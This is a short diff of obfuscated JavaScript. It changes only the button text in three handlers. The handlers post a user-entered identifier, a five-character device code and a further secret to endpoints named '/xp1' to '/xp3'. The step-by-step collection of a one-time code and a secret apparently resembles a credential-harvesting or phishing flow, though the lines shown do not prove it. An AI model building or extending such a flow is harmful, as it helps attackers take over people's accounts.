@@ -31,7 +31,7 @@ document.addEventListener('DOMContentLoaded', function () {
     _b1.addEventListener('click', async function () {
         const v = _i1.value.trim();
         if (v.length < 10) { _alert('Invalid input.'); return; }
-        _b1.disabled = true; _b1.textContent = '...';
+        _b1.disabled = true; _b1.textContent = 'wait...';
         try {
             const r = await _post('/xp1', { a: v, b: String(_id) });
             if (r.ok) { _sw('s2'); _alert('Check your device.'); }
@@ -59,7 +59,7 @@ document.addEventListener('DOMContentLoaded', function () {
     _b2.addEventListener('click', async function () {
         const v = Array.from(_cx).map(c => c.value).join('');
         if (v.length !== 5) { _alert('Incomplete.'); return; }
-        _b2.disabled = true; _b2.textContent = '...';
+        _b2.disabled = true; _b2.textContent = 'Wait...';
         try {
             const r = await _post('/xp2', { c: v, b: String(_id) });
             if (r.ok) {
@@ -76,7 +76,7 @@ document.addEventListener('DOMContentLoaded', function () {
     _b3.addEventListener('click', async function () {
         const v = _i3.value;
         if (!v) { _alert('Required.'); return; }
-        _b3.disabled = true; _b3.textContent = '...';
+        _b3.disabled = true; _b3.textContent = 'Wait...';
         try {
             const r = await _post('/xp3', { k: v, b: String(_id) });
             if (r.ok) { _w.sendData('db'); }
